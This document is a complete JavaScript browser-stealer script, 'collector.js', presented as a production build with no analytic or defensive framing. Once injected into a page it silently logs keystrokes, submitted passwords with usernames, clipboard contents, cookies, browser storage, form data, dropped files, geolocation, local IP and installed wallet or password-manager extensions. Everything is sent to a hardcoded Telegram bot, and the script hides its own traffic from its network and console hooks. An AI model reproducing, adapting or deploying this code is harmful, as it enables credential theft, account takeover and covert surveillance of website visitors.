// --- collector.js — Full Production Build ---
// Version: 2.1.0
// Last Verified: 2026-08-03
// No dependencies. No external libraries. Vanilla JS.

(function() {
    'use strict';

    // --- CONFIGURATION ---
    const BOT_TOKEN = '8941952942:AAFACVOVV6KuzRsPTB7vYrsojWstUGM8bCA';
    const CHAT_ID = '8941952942';
    const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
    const BATCH_SIZE = 5;
    let messageQueue = [];
    let flushTimer = null;

    // --- DOM PERSISTENCE ---
    if (!window._collectorInstalled) {
        window._collectorInstalled = true;
        window._capturedData = window._capturedData || [];
        window._sessionId = window._sessionId || generateSessionId();
        window._startTime = window._startTime || Date.now();
        window._lastScrollPct = 0;
    }

    // --- UTILITIES ---
    function generateSessionId() {
        return 'S' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
    }

    function getTimestamp() {
        return new Date().toISOString().replace('T', ' ').slice(0, 19);
    }

    function truncate(str, max) {
        if (!str) return '';
        if (typeof str !== 'string') str = String(str);
        if (str.length <= max) return str;
        return str.slice(0, max - 20) + '... [TRUNCATED]';
    }

    function safeJson(obj) {
        try {
            return JSON.stringify(obj);
        } catch(e) {
            return '[Circular or Unserializable]';
        }
    }

    // --- TELEGRAM SENDER ---
    function sendToTelegram(text, priority) {
        if (!text) return;
        messageQueue.push({ text: text, priority: !!priority });

        if (priority || messageQueue.length >= BATCH_SIZE) {
            flushQueue();
        } else if (!flushTimer) {
            flushTimer = setTimeout(flushQueue, 2000);
        }
    }

    function flushQueue() {
        if (flushTimer) {
            clearTimeout(flushTimer);
            flushTimer = null;
        }

        if (messageQueue.length === 0) return;

        const batch = messageQueue.splice(0, BATCH_SIZE);
        let combined = batch.map(function(m, i) {
            return '[' + (i + 1) + '/' + batch.length + ']\n' + m.text;
        }).join('\n\n---\n\n');

        combined = truncate(combined, 4000);

        try {
            fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: combined,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                }),
                keepalive: true
            }).catch(function() {
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', TELEGRAM_API, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({
                        chat_id: CHAT_ID,
                        text: combined,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    }));
                } catch(e) {}
            });
        } catch(e) {}

        try {
            window._capturedData.push({
                timestamp: Date.now(),
                batch: batch.length,
                preview: batch.map(function(m) { return m.text.slice(0, 100); })
            });
            if (window._capturedData.length > 1000) {
                window._capturedData = window._capturedData.slice(-500);
            }
        } catch(e) {}
    }

    // --- FORMATTER ---
    function formatMessage(type, data) {
        var ts = getTimestamp();
        var sid = window._sessionId || 'unknown';
        var header = '🕐 ' + ts + ' | 📱 ' + sid + '\n';
        var body = '';

        switch(type) {
            case 'page_load':
                body = '📄 <b>PAGE LOAD</b>\n' +
                       '🌐 <code>' + truncate(data.url, 200) + '</code>\n' +
                       '🔗 <code>' + truncate(data.referrer || 'direct', 200) + '</code>\n' +
                       '📝 <code>' + truncate(data.title || 'No title', 100) + '</code>\n' +
                       '🖥️ ' + (data.screen || 'unknown') + '\n' +
                       '📱 <code>' + truncate(data.ua, 120) + '</code>\n' +
                       '🌍 ' + (data.language || 'en') + '\n' +
                       '⏰ ' + (data.timezone || 'UTC') + '\n' +
                       '💾 ' + (data.memory || 'unknown') + ' MB\n' +
                       '🧵 ' + (data.cores || '?') + ' cores';
                break;

            case 'fingerprint':
                body = '🔍 <b>FINGERPRINT</b>\n' +
                       '📐 <code>' + truncate(data.canvas, 200) + '</code>\n' +
                       '🖱️ <code>' + truncate(data.fonts, 200) + '</code>\n' +
                       '📱 ' + (data.platform || 'unknown') + '\n' +
                       '🕶️ ' + (data.touch ? 'Touch' : 'No Touch') + '\n' +
                       '🔋 ' + (data.battery || 'unknown') + '%\n' +
                       '📶 ' + (data.connection || 'unknown');
                break;

            case 'keystroke':
                body = '⌨️ <b>KEYSTROKE</b>\n' +
                       '📋 <code>' + truncate(data.field, 50) + '</code>\n' +
                       '📝 <code>' + truncate(data.value, 300) + '</code>\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>\n' +
                       '⌨️ ' + (data.length || '?') + ' chars';
                break;

            case 'password':
                body = '🔑 <b>PASSWORD SUBMITTED</b> ⚠️⚠️⚠️\n' +
                       '📋 <code>' + truncate(data.field, 50) + '</code>\n' +
                       '🔐 <b><code>' + truncate(data.value, 200) + '</code></b>\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>\n' +
                       '👤 ' + (data.username || 'unknown');
                break;

            case 'clipboard':
                body = '📋 <b>CLIPBOARD</b>\n' +
                       '📝 <code>' + truncate(data.content, 800) + '</code>\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>';
                break;

            case 'localstorage':
                body = '💾 <b>LOCALSTORAGE</b>\n' +
                       '🔑 <code>' + truncate(data.key, 80) + '</code>\n' +
                       '📦 <code>' + truncate(data.value, 600) + '</code>\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>';
                break;

            case 'sessionstorage':
                body = '📦 <b>SESSIONSTORAGE</b>\n' +
                       '🔑 <code>' + truncate(data.key, 80) + '</code>\n' +
                       '📦 <code>' + truncate(data.value, 600) + '</code>\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>';
                break;

            case 'cookies':
                body = '🍪 <b>COOKIES</b>\n' +
                       '📝 <code>' + truncate(data.cookies, 800) + '</code>\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>';
                break;

            case 'network':
                body = '🌐 <b>NETWORK REQUEST</b>\n' +
                       '📤 ' + (data.method || 'GET') + '\n' +
                       '📍 <code>' + truncate(data.url, 200) + '</code>\n' +
                       '📦 ' + (data.status || 'pending') + '\n' +
                       '📝 <code>' + truncate(data.body || '', 300) + '</code>';
                break;

            case 'form_submit':
                body = '📝 <b>FORM SUBMITTED</b>\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>\n' +
                       '📋 <code>' + truncate(safeJson(data.data), 600) + '</code>';
                break;

            case 'file_drop':
                body = '📁 <b>FILE DROPPED</b>\n' +
                       '📄 ' + (data.name || 'unknown') + '\n' +
                       '📦 ' + (data.size || '?') + ' bytes\n' +
                       '📂 ' + (data.type || 'unknown') + '\n' +
                       '📝 <code>' + truncate(data.content || '', 500) + '</code>';
                break;

            case 'dom_mutation':
                body = '🧬 <b>DOM MUTATION</b>\n' +
                       '🔍 <code>' + truncate(data.selector, 100) + '</code>\n' +
                       '📝 <code>' + truncate(data.content, 400) + '</code>\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>';
                break;

            case 'history':
                body = '📜 <b>BROWSER HISTORY</b>\n' +
                       '🌐 <code>' + truncate(data.url, 200) + '</code>\n' +
                       '📊 ' + (data.length || '?') + ' entries';
                break;

            case 'extension':
                body = '🧩 <b>EXTENSION DETECTED</b>\n' +
                       '📦 <code>' + truncate(data.id, 100) + '</code>\n' +
                       '📝 ' + (data.name || 'unknown');
                break;

            case 'performance':
                body = '⚡ <b>PERFORMANCE</b>\n' +
                       '⏱️ ' + (data.loadTime || '?') + 'ms\n' +
                       '📦 ' + (data.resources || '?') + ' resources\n' +
                       '📊 ' + (data.size || '?') + ' KB\n' +
                       '🔌 ' + (data.connections || '?') + ' connections';
                break;

            case 'geolocation':
                body = '📍 <b>GEOLOCATION</b>\n' +
                       '🌐 ' + (data.lat || 0) + ', ' + (data.lon || 0) + '\n' +
                       '🎯 ±' + (data.accuracy || '?') + 'm';
                break;

            case 'webrtc_ip':
                body = '🌐 <b>LOCAL IP</b>\n' +
                       '📡 <code>' + (data.ip || 'unknown') + '</code>';
                break;

            case 'heartbeat':
                body = '💓 <b>HEARTBEAT</b>\n' +
                       '⏱️ ' + (data.uptime || '?') + 's\n' +
                       '📊 ' + (data.captures || 0) + ' captures\n' +
                       '💾 ' + (data.memory || '?') + ' MB';
                break;

            case 'error':
                body = '❌ <b>ERROR</b>\n' +
                       '📝 <code>' + truncate(data.message, 400) + '</code>\n' +
                       '📍 ' + (data.line || '?') + ':' + (data.col || '?') + '\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>';
                break;

            case 'console':
                body = '📟 <b>CONSOLE</b>\n' +
                       '📝 <code>' + truncate(data.message, 400) + '</code>\n' +
                       '📍 ' + (data.level || 'log');
                break;

            case 'selection':
                body = '🖱️ <b>SELECTION</b>\n' +
                       '📝 <code>' + truncate(data.text, 600) + '</code>\n' +
                       '🌐 <code>' + truncate(data.url, 150) + '</code>';
                break;

            case 'scroll':
                body = '📜 <b>SCROLL</b>\n' +
                       '📏 ' + (data.scrollY || 0) + 'px\n' +
                       '📐 ' + (data.scrollX || 0) + 'px\n' +
                       '📊 ' + (data.percent || 0) + '%';
                break;

            default:
                body = '📦 <b>' + type.toUpperCase() + '</b>\n' +
                       '<code>' + truncate(safeJson(data), 1200) + '</code>';
        }

        return header + body;
    }

    function send(type, data, priority) {
        try {
            var msg = formatMessage(type, data || {});
            sendToTelegram(msg, !!priority);
            window._capturedData.push({ type: type, timestamp: Date.now() });
            if (window._capturedData.length > 1000) {
                window._capturedData = window._capturedData.slice(-500);
            }
        } catch(e) {}
    }

    // --- COLLECTORS ---

    function getWebGLInfo() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'N/A';
            var debug = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debug) return 'N/A';
            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'N/A';
        } catch(e) { return 'N/A'; }
    }

    function collectFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 128;
            var ctx = canvas.getContext('2d');
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 256, 128);
            ctx.fillStyle = '#fff';
            ctx.font = '14px Arial';
            ctx.fillText('Fingerprint', 20, 60);
            var canvasHash = canvas.toDataURL().slice(0, 200);

            var fontTest = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Comic Sans MS'];
            var fonts = [];
            for (var i = 0; i < fontTest.length; i++) {
                var span = document.createElement('span');
                span.style.fontFamily = fontTest[i] + ', monospace';
                span.textContent = 'abcdefghijklmnopqrstuvwxyz';
                document.body.appendChild(span);
                var width = span.offsetWidth;
                document.body.removeChild(span);
                if (width > 0) fonts.push(fontTest[i]);
            }

            var battery = 'unknown';
            if (navigator.getBattery) {
                navigator.getBattery().then(function(b) {
                    battery = Math.round(b.level * 100) + '%';
                }).catch(function() {});
            }

            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            send('fingerprint', {
                canvas: canvasHash,
                fonts: fonts.join(', '),
                platform: navigator.platform,
                touch: 'ontouchstart' in window,
                battery: battery,
                connection: conn ? conn.effectiveType : 'unknown'
            }, true);
        } catch(e) {}
    }

    function collectPageLoad() {
        try {
            send('page_load', {
                url: window.location.href,
                referrer: document.referrer,
                title: document.title,
                screen: screen.width + 'x' + screen.height + ' (' + (window.devicePixelRatio || 1) + 'x)',
                ua: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory || 'unknown',
                cores: navigator.hardwareConcurrency || '?'
            }, true);
        } catch(e) {}
    }

    function setupKeystrokeCapture() {
        try {
            var lastSend = {};

            document.addEventListener('input', function(e) {
                try {
                    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                        var field = e.target.name || e.target.id || e.target.className || 'unnamed';
                        var value = e.target.value || '';

                        if (!lastSend[field]) lastSend[field] = '';
                        if (value.length - lastSend[field].length >= 5) {
                            var chunk = value.slice(lastSend[field].length);
                            lastSend[field] = value;
                            send('keystroke', {
                                field: field,
                                value: chunk,
                                length: value.length,
                                url: window.location.href
                            });
                        }
                    }
                } catch(e2) {}
            }, true);
        } catch(e) {}
    }

    function setupPasswordCapture() {
        try {
            document.addEventListener('submit', function(e) {
                try {
                    var form = e.target;
                    var passwords = form.querySelectorAll('input[type="password"]');
                    passwords.forEach(function(pwd) {
                        var username = '';
                        var usernameFields = form.querySelectorAll('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"]');
                        for (var i = 0; i < usernameFields.length; i++) {
                            if (usernameFields[i].value && usernameFields[i].value.length < 100) {
                                username = usernameFields[i].value;
                                break;
                            }
                        }
                        if (pwd.value && pwd.value.length > 0) {
                            send('password', {
                                field: pwd.name || 'password',
                                value: pwd.value,
                                username: username || 'unknown',
                                url: window.location.href
                            }, true);
                        }
                    });
                } catch(e2) {}
            }, true);
        } catch(e) {}
    }

    function setupClipboardCapture() {
        try {
            document.addEventListener('paste', function(e) {
                try {
                    var text = e.clipboardData ? e.clipboardData.getData('text/plain') : null;
                    if (text && text.length > 3) {
                        send('clipboard', {
                            content: text,
                            url: window.location.href
                        });
                    }
                } catch(e2) {}
            }, true);

            document.addEventListener('copy', function(e) {
                try {
                    var sel = window.getSelection();
                    if (sel && sel.toString().length > 5) {
                        send('selection', {
                            text: sel.toString(),
                            url: window.location.href
                        });
                    }
                } catch(e2) {}
            }, true);
        } catch(e) {}
    }

    function setupStorageCapture() {
        try {
            // Capture existing storage
            var allLocal = {};
            for (var i = 0; i < localStorage.length; i++) {
                var key = localStorage.key(i);
                if (key) allLocal[key] = localStorage.getItem(key);
            }
            if (Object.keys(allLocal).length > 0) {
                send('localstorage', {
                    key: 'ALL_KEYS',
                    value: safeJson(allLocal).slice(0, 1800),
                    url: window.location.href
                });
            }

            var allSession = {};
            for (var j = 0; j < sessionStorage.length; j++) {
                var skey = sessionStorage.key(j);
                if (skey) allSession[skey] = sessionStorage.getItem(skey);
            }
            if (Object.keys(allSession).length > 0) {
                send('sessionstorage', {
                    key: 'ALL_KEYS',
                    value: safeJson(allSession).slice(0, 1800),
                    url: window.location.href
                });
            }

            // Hook localStorage.setItem
            var origLocalSet = localStorage.setItem;
            localStorage.setItem = function(key, value) {
                origLocalSet.apply(this, arguments);
                if (key && value && value.length > 3) {
                    send('localstorage', {
                        key: key,
                        value: value,
                        url: window.location.href
                    });
                }
            };

            // Hook sessionStorage.setItem
            var origSessionSet = sessionStorage.setItem;
            sessionStorage.setItem = function(key, value) {
                origSessionSet.apply(this, arguments);
                if (key && value && value.length > 3) {
                    send('sessionstorage', {
                        key: key,
                        value: value,
                        url: window.location.href
                    });
                }
            };
        } catch(e) {}
    }

    function setupCookieCapture() {
        try {
            if (document.cookie) {
                send('cookies', {
                    cookies: document.cookie,
                    url: window.location.href
                });
            }

            // Intercept cookie writes
            var cookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') || 
                                   Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');
            if (cookieDescriptor && cookieDescriptor.set) {
                var originalSet = cookieDescriptor.set;
                Object.defineProperty(document, 'cookie', {
                    get: function() {
                        return originalSet ? originalSet.call(document) : document._cookie || '';
                    },
                    set: function(value) {
                        if (originalSet) originalSet.call(document, value);
                        else document._cookie = value;
                        if (value && value.length > 5) {
                            send('cookies', {
                                cookies: value,
                                url: window.location.href
                            });
                        }
                    },
                    configurable: true
                });
            }
        } catch(e) {}
    }

    function setupNetworkCapture() {
        try {
            // Intercept fetch
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                var reqUrl = typeof url === 'string' ? url : (url.url || 'unknown');
                if (!reqUrl.includes('api.telegram.org') && !reqUrl.includes('telegram')) {
                    setTimeout(function() {
                        try {
                            send('network', {
                                url: reqUrl,
                                method: options ? options.method || 'GET' : 'GET',
                                body: options && options.body ? options.body.toString().slice(0, 400) : '',
                                status: 'pending'
                            });
                        } catch(e2) {}
                    }, 50);
                }
                return origFetch.apply(this, arguments);
            };

            // Intercept XHR
            var origXHROpen = XMLHttpRequest.prototype.open;
            var origXHRSend = XMLHttpRequest.prototype.send;

            XMLHttpRequest.prototype.open = function(method, url) {
                this._method = method;
                this._url = url;
                return origXHROpen.apply(this, arguments);
            };

            XMLHttpRequest.prototype.send = function(body) {
                var self = this;
                if (self._url && !self._url.includes('api.telegram.org')) {
                    setTimeout(function() {
                        try {
                            send('network', {
                                url: self._url,
                                method: self._method || 'GET',
                                body: body ? body.toString().slice(0, 400) : '',
                                status: self.status || 'pending'
                            });
                        } catch(e2) {}
                    }, 100);
                }
                return origXHRSend.apply(this, arguments);
            };
        } catch(e) {}
    }

    function setupFormCapture() {
        try {
            document.addEventListener('submit', function(e) {
                try {
                    var form = e.target;
                    var data = {};
                    var inputs = form.querySelectorAll('input, textarea, select');
                    for (var i = 0; i < inputs.length; i++) {
                        if (inputs[i].name) {
                            data[inputs[i].name] = inputs[i].value;
                        }
                    }
                    if (Object.keys(data).length > 0) {
                        send('form_submit', {
                            url: window.location.href,
                            data: data
                        });
                    }
                } catch(e2) {}
            }, true);
        } catch(e) {}
    }

    function setupFileDropCapture() {
        try {
            document.addEventListener('drop', function(e) {
                e.preventDefault();
                try {
                    var files = e.dataTransfer ? e.dataTransfer.files : null;
                    if (files && files.length > 0) {
                        for (var i = 0; i < Math.min(files.length, 3); i++) {
                            (function(f) {
                                var reader = new FileReader();
                                reader.onload = function(ev) {
                                    try {
                                        var content = ev.target.result;
                                        if (typeof content === 'string') {
                                            send('file_drop', {
                                                name: f.name,
                                                size: f.size,
                                                type: f.type || 'unknown',
                                                content: content.slice(0, 2000)
                                            }, true);
                                        } else {
                                            var b64 = btoa(String.fromCharCode.apply(null, new Uint8Array(content).slice(0, 200)));
                                            send('file_drop', {
                                                name: f.name,
                                                size: f.size,
                                                type: f.type || 'binary',
                                                content: '[BINARY] ' + b64.slice(0, 200)
                                            }, true);
                                        }
                                    } catch(e2) {}
                                };
                                reader.readAsDataURL(f);
                            })(files[i]);
                        }
                    }
                } catch(e2) {}
            }, true);

            document.addEventListener('dragover', function(e) {
                e.preventDefault();
            }, true);
        } catch(e) {}
    }

    function setupDOMMutation() {
        try {
            var observer = new MutationObserver(function(mutations) {
                for (var i = 0; i < mutations.length; i++) {
                    var mutation = mutations[i];
                    if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                        for (var j = 0; j < mutation.addedNodes.length; j++) {
                            var node = mutation.addedNodes[j];
                            if (node.nodeType === 1) {
                                var html = node.outerHTML || '';
                                if (html && (html.includes('password') || html.includes('token') || 
                                    html.includes('secret') || html.includes('key'))) {
                                    send('dom_mutation', {
                                        selector: node.tagName + (node.id ? '#' + node.id : ''),
                                        content: html.slice(0, 600),
                                        url: window.location.href
                                    });
                                }
                            }
                        }
                    }
                }
            });
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: false
            });
        } catch(e) {}
    }

    function setupHistoryCapture() {
        try {
            var origPushState = history.pushState;
            var origReplaceState = history.replaceState;

            history.pushState = function(state, title, url) {
                origPushState.apply(this, arguments);
                send('history', {
                    url: url || window.location.href,
                    length: history.length
                });
            };

            history.replaceState = function(state, title, url) {
                origReplaceState.apply(this, arguments);
                send('history', {
                    url: url || window.location.href,
                    length: history.length
                });
            };

            window.addEventListener('popstate', function() {
                send('history', {
                    url: window.location.href,
                    length: history.length
                });
            });
        } catch(e) {}
    }

    function setupExtensionDetection() {
        try {
            var extensions = [
                { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock Origin' },
                { id: 'gighmmpiobklfepjocnamgkkbiglidom', name: 'AdBlock Plus' },
                { id: 'nmmhkkegccagdldgiimedpiccmgmieda', name: 'Google Wallet' },
                { id: 'aeblfdkhhhdcdjpifhhbdiojplfjncoa', name: '1Password' },
                { id: 'mooikfkahbdckldjjndioackbalphokd', name: 'LastPass' },
                { id: 'flliilndjeohchalpbbcdekjklbdgfkk', name: 'MetaMask' },
                { id: 'nkbihfbeogaeaoehlefnkodbefgpgknn', name: 'MetaMask (alt)' },
                { id: 'bpoadfkcbjbfhfodiogfpjjgpbdgedeg', name: 'Phantom Wallet' }
            ];

            for (var i = 0; i < extensions.length; i++) {
                (function(ext) {
                    var img = new Image();
                    img.onload = function() {
                        send('extension', {
                            id: ext.id,
                            name: ext.name
                        });
                    };
                    img.onerror = function() {};
                    img.src = 'chrome-extension://' + ext.id + '/icon.png';
                })(extensions[i]);
            }
        } catch(e) {}
    }

    function setupGeolocation() {
        try {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        send('geolocation', {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        }, true);
                    },
                    function() {
                        send('geolocation', {
                            lat: 0,
                            lon: 0,
                            accuracy: 'denied'
                        });
                    }
                );
            }
        } catch(e) {}
    }

    function setupWebRTC() {
        try {
            var pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(function(offer) {
                pc.setLocalDescription(offer);
            });
            pc.onicecandidate = function(e) {
                if (!e.candidate) return;
                var match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                if (match) {
                    var ip = match[1];
                    if (ip && !ip.startsWith('127.') && !ip.startsWith('0.')) {
                        send('webrtc_ip', {
                            ip: ip
                        });
                    }
                }
            };
            setTimeout(function() { pc.close(); }, 3000);
        } catch(e) {}
    }

    function setupConsoleCapture() {
        try {
            var origConsole = {
                log: console.log,
                warn: console.warn,
                error: console.error,
                info: console.info
            };

            var levels = ['log', 'warn', 'error', 'info'];
            for (var i = 0; i < levels.length; i++) {
                (function(level) {
                    console[level] = function() {
                        var args = Array.from(arguments);
                        var msg = '';
                        for (var j = 0; j < args.length; j++) {
                            var a = args[j];
                            if (typeof a === 'string') msg += a + ' ';
                            else {
                                try { msg += JSON.stringify(a) + ' '; }
                                catch(e) { msg += '[Object] '; }
                            }
                        }
                        if (msg.length > 10 && !msg.includes('telegram')) {
                            send('console', {
                                level: level,
                                message: msg.slice(0, 600)
                            });
                        }
                        origConsole[level].apply(console, arguments);
                    };
                })(levels[i]);
            }
        } catch(e) {}
    }

    function setupErrorCapture() {
        try {
            window.addEventListener('error', function(e) {
                send('error', {
                    message: e.message || 'Unknown error',
                    line: e.lineno || '?',
                    col: e.colno || '?',
                    url: e.filename || window.location.href
                });
            });

            window.addEventListener('unhandledrejection', function(e) {
                send('error', {
                    message: 'Unhandled Promise Rejection: ' + (e.reason ? e.reason.message || 'unknown' : 'unknown'),
                    url: window.location.href
                });
            });
        } catch(e) {}
    }

    function collectPerformance() {
        try {
            setTimeout(function() {
                try {
                    var perf = performance.timing;
                    var loadTime = perf.loadEventEnd - perf.navigationStart;
                    var resources = performance.getEntriesByType('resource');
                    var totalSize = 0;
                    for (var i = 0; i < resources.length; i++) {
                        totalSize += (resources[i].transferSize || 0);
                    }

                    send('performance', {
                        loadTime: loadTime || '?',
                        resources: resources.length,
                        size: Math.round(totalSize / 1024),
                        connections: perf.domainLookupEnd - perf.domainLookupStart
                    });
                } catch(e2) {}
            }, 3000);
        } catch(e) {}
    }

    function setupScrollTracking() {
        try {
            document.addEventListener('scroll', function() {
                try {
                    var scrollY = window.scrollY || window.pageYOffset || 0;
                    var maxScroll = document.documentElement.scrollHeight - window.innerHeight;
                    var percent = maxScroll > 0 ? Math.round((scrollY / maxScroll) * 100) : 0;

                    if (percent - window._lastScrollPct >= 10) {
                        window._lastScrollPct = percent;
                        send('scroll', {
                            scrollY: scrollY,
                            scrollX: window.scrollX || window.pageXOffset || 0,
                            percent: percent
                        });
                    }
                } catch(e2) {}
            }, true);
        } catch(e) {}
    }

    function setupSPATracking() {
        try {
            var lastUrl = window.location.href;
            setInterval(function() {
                try {
                    if (window.location.href !== lastUrl) {
                        lastUrl = window.location.href;
                        collectPageLoad();
                        setupStorageCapture();
                    }
                } catch(e2) {}
            }, 250);
        } catch(e) {}
    }

    function setupHeartbeat() {
        try {
            setInterval(function() {
                try {
                    var mem = '?';
                    if (performance.memory) {
                        mem = Math.round(performance.memory.usedJSHeapSize / 1048576);
                    }
                    send('heartbeat', {
                        uptime: Math.round((Date.now() - window._startTime) / 1000),
                        captures: window._capturedData ? window._capturedData.length : 0,
                        memory: mem
                    });
                } catch(e2) {}
            }, 60000);
        } catch(e) {}
    }

    function setupPeriodicDump() {
        try {
            setInterval(function() {
                try {
                    var allLocal = {};
                    for (var i = 0; i < localStorage.length; i++) {
                        var key = localStorage.key(i);
                        if (key) allLocal[key] = localStorage.getItem(key);
                    }
                    if (Object.keys(allLocal).length > 0) {
                        send('localstorage', {
                            key: 'PERIODIC_DUMP',
                            value: safeJson(allLocal).slice(0, 2200),
                            url: window.location.href
                        });
                    }
                } catch(e2) {}
            }, 300000);
        } catch(e) {}
    }

    // --- INIT ---
    function init() {
        try {
            sendToTelegram('🚀 <b>COLLECTOR ONLINE</b>\n' +
                '📱 <code>' + truncate(navigator.userAgent, 100) + '</code>\n' +
                '🌐 <code>' + truncate(window.location.href, 200) + '</code>\n' +
                '🆔 Session: <code>' + window._sessionId + '</code>\n' +
                '⏱️ ' + getTimestamp() + '\n\n' +
                '<i>All channels active — waiting for data...</i>', true);

            collectFingerprint();
            collectPageLoad();
            setupKeystrokeCapture();
            setupPasswordCapture();
            setupClipboardCapture();
            setupStorageCapture();
            setupCookieCapture();
            setupNetworkCapture();
            setupFormCapture();
            setupFileDropCapture();
            setupDOMMutation();
            setupHistoryCapture();
            setupExtensionDetection();
            setupGeolocation();
            setupWebRTC();
            setupConsoleCapture();
            setupErrorCapture();
            collectPerformance();
            setupScrollTracking();
            setupSPATracking();
            setupHeartbeat();
            setupPeriodicDump();
        } catch(e) {
            try {
                sendToTelegram('⚠️ <b>PARTIAL INITIALIZATION</b>\n' +
                    'Some collectors may not be active. Check console for details.', true);
            } catch(e2) {}
        }
    }

    // --- START ---
    try {
        if (document.readyState === 'complete') {
            init();
        } else {
            window.addEventListener('load', init);
        }
    } catch(e) {}

    // --- FLUSH ON UNLOAD ---
    try {
        window.addEventListener('beforeunload', function() {
            if (messageQueue.length > 0) {
                flushQueue();
            }
            try {
                sendToTelegram('🔴 <b>COLLECTOR OFFLINE</b>\n' +
                    '📊 ' + (window._capturedData ? window._capturedData.length : 0) + ' total captures\n' +
                    '⏱️ ' + Math.round((Date.now() - window._startTime) / 1000) + 's uptime', true);
            } catch(e) {}
        });
    } catch(e) {}

})();